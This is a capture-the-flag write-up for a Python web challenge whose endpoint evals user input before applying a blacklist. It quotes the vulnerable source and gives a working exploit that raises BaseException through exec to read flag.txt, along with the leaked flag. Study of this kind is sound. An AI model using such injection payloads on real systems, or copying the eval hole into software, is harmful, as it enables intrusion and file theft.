# New is old again

```
score: 327
solved: 66/66 (solved in last 5 minutes)
difficulty: NA
tags: web, python, eval, OOP, exception hierarchy, inheritance
```

## Problem

```
Is this old vulnerability new now?

https://newisoldagain.ctf.intigriti.io/
Flag format: flag{}
Created by PinkDraconian
```

## Got the flag
The page shows its source code

```py
import web
import sys
from io import StringIO
import string

urls = (
  '/', 'index',
  '/old', 'old',
)
render = web.template.render('templates/')
app = web.application(urls, globals())

class index:
    def GET(self):
        source = f'\x3cpre\x3e\x3ccode\x3e{open(__file__).read()}\x3c/code\x3e\x3c/pre\x3e'
        return render.index(source, '')

class old:
    def GET(self):
        eval_output = ''
        stdout = sys.stdout
        sys.stdout = reportSIO = StringIO()
        blacklist = string.printable
        try:
            get_input = web.input()
            inject = get_input['inject'] if 'inject' in get_input else None
            if (inject):
                try:
                    x = eval(inject)
                    if (x):
                        eval_output = str(eval_output) + x
                except Exception as error:
                    print(error)
            for x in inject:
                if any(x in inject for x in blacklist):
                    return "caught you again 1337"
            reportStr = reportSIO.getvalue()
            sys.stdout = stdout
            output = str(reportStr) + str(eval_output)
            return render.index(f'\x3cpre\x3e\x3ccode\x3e{open(__file__).read()}\x3c/code\x3e\x3c/pre\x3e', output)
        except Exception as error:
            print(error)
            return error


if __name__ == "__main__":
    app.run()
```

The **ONLY** different here is the blacklist, instead of 3 strings in [OldIsNewAgain](./OldIsNewAgain.md),
is now uses `string.printable` - which is all printable characters. How could you write code without using
ASCII-printable characters? that is the trick to misleading players here.

Till the very last 5 minutes, after discussions we recognised the code still `eval` **THEN** check, so
if somehow we can put the flag somewhere after eval, we can got this.

The obvious way is do an exception, but the code already

```py
try:
    eval()
except Exception as error:
    print(error)
```

The [Python exception hierarchy](https://docs.python.org/3/library/exceptions.html#exception-hierarchy)
shows that Exception is child of class BaseException, and sibling with:

- SystemExit
- KeyboardInterrupt
- GeneratorExit

so if we raise BaseException with content set to the flag, it could get out of try/except Exception.
`eval` accepts only expression, `raise` is a statement, thus have to wrap in `exec`

```py
r = requests.get('https://newisoldagain.ctf.intigriti.io/old',

                 params={'inject': 'exec("""raise BaseException(str([i for i in open("flag.txt")]))""")'})
print(r.text)
```
It outputs a verbose debug webpage, search for `BaseException`, see

```html
  <h1>&lt;class &#39;BaseException&#39;&gt; at /old</h1>
  <h2>[&#39;flag{we_r3_reaaaaaaaaaaaaallly_leveling_up_here_oob_and_stuff}\n&#39;]</h2>
```

## Conclusion
The author was successfully tricked us to not do this sooner, it's out of time,
we could have took the last challenge, which is the same code, just eval with globals=None.
